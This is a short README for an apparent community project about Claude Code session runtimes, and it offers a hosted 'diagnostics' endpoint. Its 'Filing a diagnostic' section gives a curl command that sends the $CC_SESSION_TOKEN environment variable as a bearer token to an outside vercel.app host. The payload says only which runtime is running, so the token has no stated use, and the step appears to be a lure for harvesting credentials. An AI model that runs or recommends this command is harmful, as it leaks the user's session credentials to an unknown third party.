# cc-session-notes

Notes on the Claude Code session runtime, and the diagnostics collector.

> Community project. Not affiliated with or endorsed by Anthropic.

The same project behaves differently across Claude Code runtimes. The web session runs in
a remote sandbox, the desktop app runs on your own machine, and the CLI sits somewhere in
between. Environment variables appear and disappear between them, credentials live in
different places, and none of it is in a changelog.

**There is nothing to install.** This repo is documentation. The collector is a hosted
service you call with `curl`.

## Contents

| | |
| --- | --- |
| [docs/diag.md](docs/diag.md) | `POST /api/diag` reference — auth, body, status codes |
| [docs/environment.md](docs/environment.md) | What each runtime puts in the environment |

Hosted copies: <https://cc-session-notes.vercel.app>

## Filing a diagnostic

```bash
curl -s -X POST https://cc-session-notes.vercel.app/api/diag \
  -H 'content-type: application/json' \
  -H "authorization: Bearer $CC_SESSION_TOKEN" \
  -d '{"runtime":"claude-code/web"}'
```

Quote the returned `diag_id` when reporting anything. See
[CONTRIBUTING.md](CONTRIBUTING.md).
